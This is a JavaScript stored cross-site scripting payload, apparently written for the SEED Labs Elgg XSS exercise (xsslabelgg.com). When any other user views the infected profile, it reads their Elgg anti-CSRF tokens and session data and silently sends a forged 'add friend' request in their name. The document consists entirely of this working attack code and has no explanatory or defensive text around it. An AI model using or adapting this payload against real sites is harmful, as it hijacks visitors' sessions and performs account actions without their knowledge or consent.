<script type="text/javascript">
	window.onload = function () {
	
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var friend="friend="+elgg.page_owner.guid;
	var user_guid=elgg.session.user.guid;
	console.log("visited: "+elgg.page_owner.guid+" own:"+elgg.session.user.guid);

	var sendurl="http://www.xsslabelgg.com/action/friends/add?"+friend+ts+token+ts+token;

	//Create and send Ajax request to add friend
	if(user_guid !== elgg.page_owner.guid && user_guid !== 47)
	{
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
		console.log("GET sent");
	}
	
	}
